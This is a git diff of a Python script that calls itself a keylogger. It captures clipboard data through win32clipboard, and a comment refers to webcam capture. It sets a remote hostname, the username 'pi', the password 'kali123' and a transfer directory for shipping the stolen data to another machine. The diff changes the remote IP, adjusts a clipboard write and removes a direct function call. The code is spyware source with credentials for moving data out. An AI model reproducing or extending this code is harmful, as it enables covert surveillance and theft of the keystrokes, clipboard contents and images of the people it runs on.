@@ -30,7 +30,7 @@ screenshot_information = ".png"
 time_iterations = 10
 number_of_iterations_end = 3
 
-myHostname = "192.168.1.5"  # change this
+myHostname = "192.168.1.16"  # change this
 myUsername = "pi"  # change this
 myPassword = "kali123"  # change this #should be 8 characters or more including special characters
 remote_file = '/home/pi/transfer/'
@@ -50,12 +50,9 @@ def copy_clipboard():
             pasted_data = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
 
-            f.write("Clipboard Data: \n" + pasted_data)
+            f.write("Clipboard Data: \n" + pasted_data + "\n")
         except:
             f.write("Clipboard Data could not be retrieved")
-
-
-copy_clipboard()
 
 
 # Captures Webcam using cv2 module
@@ -217,4 +214,7 @@ while number_of_iterations < number_of_iterations_end:  # The keylogger will run
 
         currentTime = time.time()
         stopTime = time.time() + time_iterations
+
+
+
 
